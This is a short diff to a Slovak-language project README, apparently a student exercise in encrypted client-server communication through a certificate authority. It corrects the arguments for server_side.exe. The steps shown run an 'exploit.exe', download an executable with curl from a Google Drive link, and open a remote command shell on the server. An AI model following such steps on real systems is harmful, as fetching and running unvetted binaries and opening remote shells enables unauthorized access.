@@ -27,7 +27,7 @@ V tejto zlozke su zdrojove kody pre sifrovanu komunikaciu v zlozke `communicatio
 - dalej je potrebne spustit CertificateAuthority.exe v novom terminaly z administrativnimy pravami
 - v terminaly kde je spusteny exploit.exe je potrebne stiahnut subor server_side.exe
     -   `curl -L -o server_side.exe "https://drive.google.com/uc?export=download&id=1MWQaEGF5sdziP5qQR7zLXzuNJT_CAgcj"` 
-- tento subor nasledovne stiahneme z prikazom server_side.exe *[ip_adresa_klienta]* *[ip_adresa_klienta]*
+- tento subor nasledovne stiahneme z prikazom server_side.exe *[ip_adresa_certifikacne_autority]* *[ip_adresa_klienta]*
 - potom spustime na klientovy subor client_side.exe a zvolime ip adresu CA *(localhost v tomto pripade)* a serveru
 - ak vsetko prebehlo ako malu virtualne cmd je inicializovane a je mozne sa pohybovat v adresarovej strukture servera a zadavat prikazy
 
